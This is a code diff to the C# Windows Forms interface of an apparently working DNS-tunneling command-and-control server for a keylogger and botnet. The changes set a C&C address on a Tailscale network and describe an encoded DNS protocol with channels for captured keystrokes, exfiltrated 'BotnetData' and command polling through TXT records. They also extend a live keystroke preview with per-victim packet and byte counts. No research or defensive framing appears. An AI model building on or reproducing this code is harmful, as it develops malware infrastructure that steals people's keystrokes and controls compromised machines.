@@ -57,7 +57,7 @@ namespace Server.UI
 
             Label lblTitle = new Label
             {
-                Text = "🔐 Authoritative DNS Server - C&C Keylogger",
+                Text = "🔐 DNS Tunneling C&C Server (Tailscale + Bind9)",
                 Font = new Font("Segoe UI", 14, FontStyle.Bold),
                 Location = new Point(10, 10),
                 AutoSize = true,
@@ -81,13 +81,22 @@ namespace Server.UI
                 Text = "53"
             };
 
-            Label lblServerIpLabel = new Label { Text = "Server IP:", Location = new Point(450, 45), AutoSize = true };
+            Label lblServerIpLabel = new Label { Text = "C&C IP:", Location = new Point(450, 45), AutoSize = true };
             txtServerIp = new TextBox
             {
                 Location = new Point(520, 43),
                 Width = 150,
-                Text = "127.0.0.1"
-
+                Text = "100.123.123.123"  // C&C Server IP on Tailscale network
+            };
+            
+            // Helper label
+            Label lblHelp = new Label 
+            { 
+                Text = "Note: Clients query DNS Resolver (100.111.111.100), which forwards to this C&C",
+                Location = new Point(690, 45), 
+                AutoSize = true,
+                ForeColor = Color.Gray,
+                Font = new Font("Segoe UI", 8)
             };
 
 
@@ -130,7 +139,7 @@ namespace Server.UI
 
             configPanel.Controls.AddRange(new Control[] {
                 lblTitle, lblDomain, txtDomain, lblPort, txtPort,
-                lblServerIpLabel, txtServerIp, lblLogPathLabel, txtLogPath, 
+                lblServerIpLabel, txtServerIp, lblHelp, lblLogPathLabel, txtLogPath, 
                 btnStartStop, lblStatus, lblConnections
             });
 
@@ -214,13 +223,16 @@ namespace Server.UI
 
             // Initial log
             LogMessage("=".PadRight(60, '='));
-            LogMessage(" AUTHORITATIVE DNS SERVER - C&C");
+            LogMessage(" DNS TUNNELING C&C SERVER (TAILSCALE + BIND9)");
             LogMessage("=".PadRight(60, '='));
-            LogMessage("Role: Act as authoritative DNS for your domain");
+            LogMessage("Architecture:");
+            LogMessage("  [Client 100.x.x.x] -> [DNS Resolver 100.111.111.100]");
+            LogMessage("                         -> [C&C Server 100.123.123.123]");
             LogMessage("Protocol:");
             LogMessage("  Connection:  a.1.1.1.domain → Returns x.x.x.[ConnID]");
-            LogMessage("  Data:        b.[Pkt].[ID].[HexData].domain → Returns [Code].x.x.x");
-            LogMessage("Normal DNS: Responds to NS, SOA, A queries");
+            LogMessage("  Keylogger:   b.[Pkt].[ID].[HexData].domain → Returns [Code].x.x.x");
+            LogMessage("  BotnetData:  c.[Pkt].[Off].[ID].[HexData].domain → Returns [Code].x.x.x");
+            LogMessage("  PollCommand: p.[Pkt].[Off].[ID].domain → Returns TXT(HexCommand)");
             LogMessage("=".PadRight(60, '='));
         }
 
@@ -284,7 +296,8 @@ namespace Server.UI
                 txtServerIp.Enabled = false;
 
                 LogMessage("\n>>> Authoritative DNS Server is LIVE <<<");
-                LogMessage($">>> Configure domain registrar to point NS to this IP <<<\n");
+                LogMessage(">>> Clients should query DNS Resolver (100.111.111.100) <<<");
+                LogMessage(">>> DNS Resolver forwards to this C&C (" + serverIp + ") <<<\n");
             }
             catch (Exception ex)
             {
@@ -333,7 +346,7 @@ namespace Server.UI
             item.SubItems.Add(client.IpAddress);
             item.SubItems.Add(client.ConnectedAt.ToString("HH:mm:ss"));
             item.SubItems.Add(client.PacketsReceived.ToString());
-            item.SubItems.Add($"{client.DataLength} bytes");
+            item.SubItems.Add("0");  
             item.Tag = client.ConnectionId;
 
             lvClients.Items.Add(item);
@@ -364,13 +377,19 @@ namespace Server.UI
             txtKeystrokePreview.AppendText(data);
             txtKeystrokePreview.ScrollToCaret();
 
-
+            // Update client statistics in ListView
             foreach (ListViewItem item in lvClients.Items)
             {
                 if (item.Tag != null && (int)item.Tag == connectionId)
                 {
+                    // Update packets count
                     int packets = int.Parse(item.SubItems[3].Text) + 1;
                     item.SubItems[3].Text = packets.ToString();
+                    
+                    // Update data size (bytes)
+                    int currentSize = int.Parse(item.SubItems[4].Text);
+                    int newSize = currentSize + data.Length;
+                    item.SubItems[4].Text = newSize.ToString();
                     break;
                 }
             }
